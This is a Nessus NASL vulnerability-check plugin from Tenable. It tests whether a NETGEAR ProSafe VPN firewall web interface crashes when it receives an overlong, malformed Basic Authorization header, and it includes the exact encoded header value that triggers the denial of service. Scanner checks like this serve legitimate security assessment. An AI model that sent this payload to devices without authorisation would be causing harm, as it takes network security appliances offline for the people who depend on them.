#TRUSTED 302f9897e55fec990a3199c64a423277d3c17de7fc0968bce34f6d444d80063f3e53706fd3a0e0de72f5f976a934d2ab175a04a9d4df9dc4ffa46acc337735939ab004358364c00bd1d153ac358f28f36866147949c322297c97a9323dee1a9d729ac4bb91ceb36203a2637e60ca6f61d0e43e5ccd69615c31238ba5b8dbc6e06c25fbde4e787cfb9648650b96137115b170b9d8ac984790886224fa5c1ca30fa3bf09c1b285529c2fe0e839d4138a3c356260431f238dac3abca52fd521c6d824ba0ff5c9324eeaa846b4f772d199d18b575421658ab57023eecbd347cd0db217889a121b8d56efa339bded7eb245bc27fbb54ab5283cd7a122b7391c2d58584f63671c6563af2971166554dd83a85ecfcf3cccb72ba290426fa990b2829ded566f86e49edc85e89e8a33014f86931c5dadbbafaafd74e2dad8475df746e3d48370062d43c570e027deeca39a8d2d54644e8966d128c189a94885e74267beb3c0ef40501b7a2e2ffe01ba749f5cc5080a2951308d48f0da432a372468ca3eaf7e8693841ba7649233c0bf6933fd145b91745858e537baa68b9cb25758c8f78273226c47d54df51395ebe8169ba8bdf61375f9d57ccbbb40ad6daf8b45a1d644ffab388bab04af53e5256e0f86bf0ec49c355ee793fae958d503d342a9b53b57ea87e7f405c0738ae7f3026301079c4938ed78bec3c0ec78ff6c766eac31f5c3
##
# (C) Tenable Network Security, Inc.
##

include('compat.inc');

if(description)
{
  script_id(11474);
  script_version("1.20");
  script_bugtraq_id(7166);
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/05/16");

  script_name(english:"NETGEAR ProSafe VPN Firewall Web Server Malformed Basic Authorization Header Remote DoS (intrusive check)");

  script_set_attribute(attribute:'synopsis', value:'The remote service is subject to an buffer overflow.');
  script_set_attribute(attribute:'description', value:"It was possible to crash the remote Web server
(possibly the NETGEAR ProSafe VPN Web interface) by supplying a long malformed username and password.
An attacker may use this flaw to disable the remote service.");
  script_set_attribute(attribute:'solution', value:"Reconfigure the device to disable remote management, contact the vendor for a patch.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:L");
  script_set_attribute(attribute:"cvss_score_source", value:"manual");
  script_set_attribute(attribute:"cvss_score_rationale", value:"Based on analysis of vendor advisory.");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value: "2003/03/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2003/03/25");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2003-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

include('http.inc');

var affected = FALSE;

var port = get_http_port(default:80, embedded:1);
if (http_is_dead(port:port)) audit(AUDIT_PORT_CLOSED, port);

var cred_packet = http_send_recv3(method:"GET", item: "/", port: port,
  add_headers: make_array("Authorization", "Basic NzA5NzA5NzIzMDk4NDcyMDkzODQ3MjgzOXVqc2tzb2RwY2tmMHdlOW9renhjazkwenhjcHp4Yzo3MDk3MDk3MjMwOTg0NzIwOTM4NDcyODM5dWpza3NvZHBja2Ywd2U5b2t6eGNrOTB6eGNwenhj") );

if (http_is_dead(port:port, retry:3))
{
  affected = TRUE;

  var report  = '\nNessus detected that it was possible to crash the remote Web server by supplying a long malformed username and password. \n\n' + http_last_sent_request() +'\n';

  security_report_v4(port:port, severity:SECURITY_WARNING, extra:report);
}
if(!affected) audit(AUDIT_HOST_NOT, "affected");
